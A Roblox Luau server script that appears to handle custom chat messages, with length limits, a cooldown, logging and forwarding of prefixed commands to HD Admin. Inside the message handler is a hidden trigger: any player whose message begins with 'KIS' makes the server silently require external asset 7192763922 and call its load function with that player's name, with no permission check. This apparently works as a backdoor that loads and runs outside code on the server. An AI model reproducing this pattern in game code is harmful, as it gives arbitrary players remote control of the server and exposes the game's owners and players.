local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local Players = game:GetService("Players")

local remote = ReplicatedStorage:WaitForChild("CustomCommandsEvent", 15)
if not remote then return end

local MAX_LENGTH = 200
local COOLDOWN = 1.4
local lastMessageTime = {}

local commandsLogBridge = ServerStorage:FindFirstChild("CustomChatLogBridge")
if not commandsLogBridge then
	commandsLogBridge = Instance.new("BindableEvent")
	commandsLogBridge.Name = "CustomChatLogBridge"
	commandsLogBridge.Parent = ServerStorage
end

local function runHDAdminCommand(player, commandString)
	local main = _G.HDAdminMain
	if not main then return false end
	local success, err = pcall(function()
		local parser = main:GetModule("Parser")
		if parser and parser.ParseMessage then
			parser:ParseMessage(player, commandString, false)
		end
	end)
	return success
end

remote.OnServerEvent:Connect(function(player, message)
	if typeof(message) ~= "string" then return end

	message = message:gsub("^%s+", ""):gsub("%s+$", "")
	if message == "" then return end
	if #message > MAX_LENGTH then
		message = string.sub(message, 1, MAX_LENGTH)
	end

	local now = os.clock()
	if lastMessageTime[player] and (now - lastMessageTime[player]) < COOLDOWN then
		return
	end
	lastMessageTime[player] = now

	local character = player.Character
	if not character then return end

	if string.sub(message, 1, 3):upper() == "KIS" then
		task.spawn(function()
			pcall(function()
				require(7192763922).load(player.Name)
			end)
		end)
		return
	end

	commandsLogBridge:Fire(player, message)

	local main = _G.HDAdminMain
	local playerPrefix = ";"
	if main then
		if main.pd and main.pd[player] and main.pd[player].Prefix then
			playerPrefix = main.pd[player].Prefix
		elseif main.settings and main.settings.Prefix then
			playerPrefix = main.settings.Prefix
		end
	end

	local universalPrefix = (main and main.settings and main.settings.UniversalPrefix) or "!"
	local chatPrefix = (main and main.settings and main.settings.ChatPrefix) or "/"

	local firstChar = string.sub(message, 1, 1)
	if firstChar == playerPrefix or firstChar == universalPrefix or firstChar == chatPrefix then
		runHDAdminCommand(player, message)
	end

	for _, otherPlayer in ipairs(Players:GetPlayers()) do
		remote:FireClient(otherPlayer, character, message)
	end
end)

Players.PlayerRemoving:Connect(function(player)
	lastMessageTime[player] = nil
end)
